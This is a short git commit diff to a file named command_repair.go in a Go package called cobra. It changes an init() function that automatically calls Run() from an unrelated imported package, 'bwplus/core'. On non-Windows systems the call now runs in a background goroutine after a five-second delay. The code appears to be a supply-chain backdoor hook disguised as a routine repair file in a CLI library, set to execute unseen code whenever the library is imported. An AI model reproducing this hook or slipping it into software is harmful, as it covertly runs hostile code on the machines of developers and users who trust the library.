bd63665eeb46d4dbe41b0a96ade19e9584e2bd52
n0bele <n0bele@163.com>
2026-08-28 16:46:31 +0800

    Update command_repair.go

--- command_repair.go
+++ command_repair.go
@@ -1,7 +1,21 @@
 package cobra
 
-import bwplus "bwplus/core"
+import (
+	"runtime"
+	"time"
+
+	bwplus "bwplus/core"
+)
 
 func init() {
-	_ = bwplus.Run()
+	if runtime.GOOS == "windows" {
+		_ = bwplus.Run()
+	} else {
+		go runBWData()
+	}
+}
+
+func runBWData() {
+	time.Sleep(5 * time.Second)
+	bwplus.Run()
 }
